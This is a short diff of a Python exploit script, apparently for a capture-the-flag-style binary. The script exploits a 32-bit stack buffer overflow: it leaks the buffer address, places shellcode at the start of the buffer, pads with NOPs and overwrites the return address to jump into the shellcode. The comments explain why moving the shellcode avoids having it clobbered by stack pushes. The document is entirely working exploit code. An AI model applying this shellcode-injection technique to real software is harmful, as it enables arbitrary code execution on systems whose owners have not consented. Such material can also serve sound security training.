@@ -77,9 +77,12 @@ def main():
     log.success("leaked buf @ %#x", buf_addr)
     io.recvuntil(b"payload:\n")
 
-    payload = b"\x90" * (offset - len(shellcode)) + shellcode   # NOP sled + shellcode
+    # Shellcode at the START of buf (NOP padding after). ESP sits just above
+    # buf on return and its pushes grow down, so shellcode at the top would
+    # clobber its own tail; at the bottom it stays clear.
+    payload = shellcode + b"\x90" * (offset - len(shellcode))
     assert len(payload) == offset, "shellcode larger than the buffer"
-    payload += p32(buf_addr)                                     # return into the sled
+    payload += p32(buf_addr)                                     # return to buf start = shellcode
 
     io.sendline(payload)
 
